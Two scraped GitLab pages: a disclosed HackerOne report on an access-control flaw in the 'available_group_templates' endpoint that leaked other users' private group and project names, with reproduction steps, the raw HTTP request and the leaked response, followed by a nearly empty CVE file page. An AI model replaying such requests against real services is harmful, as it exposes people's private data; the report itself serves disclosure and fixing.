=== Content from gitlab.com_d06882aa_20250114_200231.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

# Disclosure of Any User's Private Group Info by `available\_group\_templates`

**[HackerOne report #475240](https://hackerone.com/reports/475240)** by `ngalog` on 2019-01-06, assigned to `asaba`:

**Summary:**
Lately gitlab allow user to create project from group template, the newly introduced endpoint didn't perform access control check, allowing unauthorized user to access the private group info of other users.

## Steps To Reproduce:

* Login gitlab.com
* visit <https://gitlab.com/users/ashleyjohnson/available_group_templates>
* In burp send the request to repeater
* add this line in header

```
X-CSRF-Token: testing
```

The full request should look like

```
GET /users/ashleyjohnson/available_group_templates HTTP/1.1
Host: gitlab.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.9 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-CSRF-Token: X-CSRF-Token: testing
X-Requested-With: XMLHttpRequest
DNT: 1
Connection: close
Cookie: xxx
Upgrade-Insecure-Requests: 1
```

Then my private group `new-jjj-groupaaa` is leaked, and the all of the project name/namespace `gitlab-ce` are leaked too

leaked info

```
var target = $(".project-templates-buttons#custom-group-project-templates");
target.empty();
target.html("&lt;div class=\"custom-project-templates\"&gt;\n&lt;div class=\"border-top-0 expanded js-template-group-options template-group-options\"&gt;\n&lt;div class=\"template-header d-flex align-items-center\"&gt;\n&lt;div class=\"template-subgroup d-flex flex-fill align-items-center\"&gt;\n&lt;div class=\"template-options-icon-container d-flex justify-content-center align-items-center append-right-10\"&gt;\n&lt;svg class=\"s16 options-expanded-icon\"&gt;&lt;use xlink:href=\"https://gitlab.com/assets/icons-1bbf3f0e2e8f631ea6006c647f843db214684476054223102c16630dabc450d4.svg#angle-down\"&gt;&lt;\/use&gt;&lt;\/svg&gt;\n&lt;svg class=\"s16 options-collapsed-icon\"&gt;&lt;use xlink:href=\"https://gitlab.com/assets/icons-1bbf3f0e2e8f631ea6006c647f843db214684476054223102c16630dabc450d4.svg#angle-right\"&gt;&lt;\/use&gt;&lt;\/svg&gt;\n&lt;\/div&gt;\n&lt;div class=\"avatar-container s40\"&gt;\n&lt;div class=\"btn-template-icon avatar s40 avatar-tile identicon bg4\"&gt;N&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"template-subgroup-name prepend-left-5\"&gt;\n&lt;strong&gt;newsub&lt;\/strong&gt;\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"template-subgroup-project-count\"&gt;\n&lt;span class=\"badge badge-pill\"&gt;\n&lt;strong&gt;\n2\n&lt;\/strong&gt;\n&lt;\/span&gt;\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"template-option align-items-center\"&gt;\n&lt;div class=\"avatar-container s40\"&gt;\n&lt;img alt=\"tempalte\" class=\"btn-template-icon avatar s40 avatar-tile\" src=\"https://gitlab.com/uploads/-/system/project/avatar/10227470/logo-extra-whitespace.png\" /&gt;\n&lt;\/div&gt;\n&lt;div class=\"description prepend-left-5\"&gt;\n&lt;strong&gt;\ntempalte\n&lt;\/strong&gt;\n&lt;br&gt;\n&lt;div class=\"text-muted\"&gt;\nteamplte\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"controls d-flex align-items-baseline\"&gt;\n&lt;a class=\"btn btn-default append-right-10\" href=\"/new-jjj-groupaaa/newsub/tempalte\" rel=\"noopener noreferrer\" target=\"_blank\"&gt;\nPreview\n&lt;\/a&gt;\n&lt;label class=\"btn btn-success custom-template-button choose-template append-bottom-0\" for=\"tempalte\"&gt;\n&lt;input autocomplete=\"off\" data-subgroup-id=\"4324729\" id=\"tempalte\" name=\"project[template_name]\" type=\"radio\" value=\"tempalte\"&gt;\n&lt;span&gt;\nUse template\n&lt;\/span&gt;\n&lt;\/label&gt;\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"template-option align-items-center\"&gt;\n&lt;div class=\"avatar-container s40\"&gt;\n&lt;img alt=\"GitLab Community Edition\" class=\"btn-template-icon avatar s40 avatar-tile\" src=\"https://gitlab.com/uploads/-/system/project/avatar/10181735/logo-extra-whitespace.png\" /&gt;\n&lt;\/div&gt;\n&lt;div class=\"description prepend-left-5\"&gt;\n&lt;strong&gt;\nGitLab Community Edition\n&lt;\/strong&gt;\n&lt;br&gt;\n&lt;div class=\"text-muted\"&gt;\nGitLab Community Edition (CE) is an open source end-to-end software development platform with built-in version control, issue tracking, code review, CI/CD, and more. Self-host GitLab CE on your own servers, in a container, or on a cloud provider.\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;div class=\"controls d-flex align-items-baseline\"&gt;\n&lt;a class=\"btn btn-default append-right-10\" href=\"/new-jjj-groupaaa/newsub/gitlab-ce\" rel=\"noopener noreferrer\" target=\"_blank\"&gt;\nPreview\n&lt;\/a&gt;\n&lt;label class=\"btn btn-success custom-template-button choose-template append-bottom-0\" for=\"GitLab Community Edition\"&gt;\n&lt;input autocomplete=\"off\" data-subgroup-id=\"4324729\" id=\"GitLab Community Edition\" name=\"project[template_name]\" type=\"radio\" value=\"GitLab Community Edition\"&gt;\n&lt;span&gt;\nUse template\n&lt;\/span&gt;\n&lt;\/label&gt;\n&lt;\/div&gt;\n&lt;\/div&gt;\n&lt;\/div&gt;\n\n&lt;\/div&gt;\n");
target.trigger("ajax:success");
```

## Impact

leaked this info to any unauthorised user

[![Screen_Shot_2019-01-06_at_10.35.55_PM.png](data:image/gif;base64...)](https://user-content.gitlab-static.net/56e8378f879e378ab1516052be6b379496361c98/68747470733a2f2f68312e7365632e6769746c61622e6e65742f612f3437353234302f3430313739362f53637265656e5f53686f745f323031392d30312d30365f61745f31302e33352e35355f504d2e706e67)

## Attachments

**Warning:** Attachments received through HackerOne, please exercise caution!

* [Screen\_Shot\_2019-01-06\_at\_10.35.55\_PM.png](https://h1.sec.gitlab.net/a/475240/401796/Screen_Shot_2019-01-06_at_10.35.55_PM.png)

Assignee
Loading

Time tracking
Loading

Confidentiality

Confidentiality controls have moved to the issue actions menu () at the top of the page.



=== Content from gitlab.com_2bf69ae4_20250114_200230.html ===


[Skip to content](#content-body)
GitLab
[Next](https://next.gitlab.com)

* Menu

  + [Why GitLab](https://about.gitlab.com/why-gitlab)
  + [Pricing](https://about.gitlab.com/pricing)
  + [Contact Sales](https://about.gitlab.com/sales)
  + [Explore](/explore)
* [Why GitLab](https://about.gitlab.com/why-gitlab)
* [Pricing](https://about.gitlab.com/pricing)
* [Contact Sales](https://about.gitlab.com/sales)
* [Explore](/explore)

* [Sign in](/users/sign_in?redirect_to_referer=yes)
* [Get free trial](/users/sign_up)

* [cves](/gitlab-org/cves/-/tree/master)
* [2021](/gitlab-org/cves/-/tree/master/2021)
* [**CVE-2021-39930.json**](/gitlab-org/cves/-/blob/master/2021/CVE-2021-39930.json)

Find file

[Blame](/gitlab-org/cves/-/blame/master/2021/CVE-2021-39930.json)
[Permalink](/gitlab-org/cves/-/blob/5dbfc725a86e6d942deec9c36b7f06f5b8d912fc/2021/CVE-2021-39930.json "Go to permalink <kbd class='flat ml-1' aria-hidden=true>y</kbd>")

* [![🤖 GitLab Bot 🤖's avatar](/uploads/-/system/user/avatar/1786152/avatar.png?width=64 "🤖 GitLab Bot 🤖")](/gitlab-bot)

  Dec 13, 2021

  [92f019ea](/gitlab-org/cves/-/commit/92f019ea9e20de10ec177ea8affaffbc3b8e7b5c)
  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/92f019ea9e20de10ec177ea8affaffbc3b8e7b5c)
  ·
  92f019ea

  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Dec 13, 2021

  92f019ea

  [Publishing 0 updated advisories and 1 new advisories](/gitlab-org/cves/-/commit/92f019ea9e20de10ec177ea8affaffbc3b8e7b5c)
  [🤖 GitLab Bot 🤖](/gitlab-bot) authored Dec 13, 2021

Loading


